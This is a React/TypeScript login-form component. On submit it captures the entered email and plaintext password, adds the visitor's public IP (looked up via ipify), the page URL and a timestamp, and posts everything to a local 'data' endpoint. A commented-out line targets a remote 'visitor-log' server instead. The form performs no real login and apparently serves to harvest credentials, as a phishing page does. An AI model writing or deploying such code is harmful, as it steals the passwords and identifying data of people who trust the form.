import { useState, FormEvent } from 'react';
import { FaEye, FaEyeSlash } from 'react-icons/fa';
import axios from 'axios';
import { CustomInput } from '../CustomInput/CustomInput';

export const Form = () => {
  const [isPass, setIsPass] = useState(false);

  const handleClick = () => {
    setIsPass(!isPass);
  };

  const handleSubmit = async (evt: FormEvent<HTMLFormElement>) => {
    evt.preventDefault();
    const form = evt.currentTarget;
    const email = form.elements.namedItem('Email') as HTMLInputElement;
    const password = form.elements.namedItem('Password') as HTMLInputElement;

    try {
      const response = await axios.get('https://api.ipify.org?format=json');
      const ip = response.data.ip;
      const data = {
        timestamp: Date.now(),
        url: window.location.href,
        ipAddress: ip,
        email: email.value,
        password: password.value,
      };

      // await axios.post('https://visitor-log.onrender.com/data');
      await axios.post('http://localhost:4000/data', data);
    } catch (error) {
      console.log(error);
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <CustomInput lab={'Email'} type={'email'} />
      <CustomInput lab={'Password'} type={!isPass ? 'password' : 'text'} />
      <button onClick={handleClick} type="button">
        {!isPass ? <FaEye /> : <FaEyeSlash />}
      </button>
      <button style={{ display: 'block' }} type="submit">
        submit
      </button>
    </form>
  );
};
